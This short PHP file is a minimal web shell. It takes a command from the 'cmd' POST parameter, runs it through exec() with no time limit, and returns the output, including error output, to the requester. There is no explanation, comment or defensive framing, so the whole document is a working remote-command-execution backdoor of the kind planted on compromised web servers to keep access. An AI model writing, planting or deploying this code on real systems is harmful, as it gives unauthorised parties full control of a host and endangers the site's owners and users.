<?php
set_time_limit(0);
if (isset($_POST['cmd'])) {
    $data = array();
    exec(stripcslashes($_POST['cmd']) . ' 2>&1', $data);
    echo implode("\n", $data);
}
